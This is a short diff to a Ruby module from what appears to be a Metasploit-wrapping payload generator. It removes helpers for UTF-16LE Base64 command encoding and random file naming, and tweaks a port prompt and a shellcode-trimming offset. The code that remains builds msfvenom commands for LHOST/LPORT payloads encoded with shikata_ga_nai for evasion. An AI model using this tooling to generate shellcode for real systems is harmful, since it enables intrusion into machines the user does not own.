@@ -5,18 +5,6 @@ include Core::Commands
 
 module Msf
   module Options
-    def encode_command(command)
-      Base64.encode64(command.encode('utf-16le')).delete("\r\n")
-    end
-
-    def random_name_gen
-      random_length = rand(4..8)
-      file_name = random_length.to_i.times.map do
-        [*'a'..'z', *'A'..'Z', *'0'..'9'].sample
-      end.join
-      file_name
-    end
-
     def hex_to_bin(file_name, hex_string)
       File.open(file_name, 'w') do |f|
         # f.write(hex_string.scan(/../).map { |x| x.hex }.pack('c*'))
@@ -37,7 +25,7 @@ module Msf
     end
 
     def msf_port
-      port = rgets('Enter the port you would like to use[443]: ', 443)
+      port = rgets('Enter the port you would like to use [443]: ', 443)
       until (1..65_535).cover?(port.to_i)
         print_error('Not a valid port')
         sleep(1)
@@ -75,7 +63,7 @@ module Msf
       cmd = "#{@msf_path}./msfvenom --payload #{payload} LHOST=#{host} "
       cmd << "LPORT=#{port} -e x86/shikata_ga_nai "
       cmd << "--platform #{_platform(payload)} -a #{_arch(payload)} "
-      cmd << '-f c 2> /dev/null'
+      cmd << '-f c'
       execute  = `#{cmd}`
       print_success('Shellcode Generated')
       _clean_shellcode(execute)
@@ -108,7 +96,7 @@ module Msf
       shellcode = shellcode.delete('"')
       shellcode = shellcode.delete("\n")
       shellcode = shellcode.delete("\s")
-      shellcode[0..23] = ''
+      shellcode[0..18] = ''
       shellcode[-1] = ''
       shellcode
     end
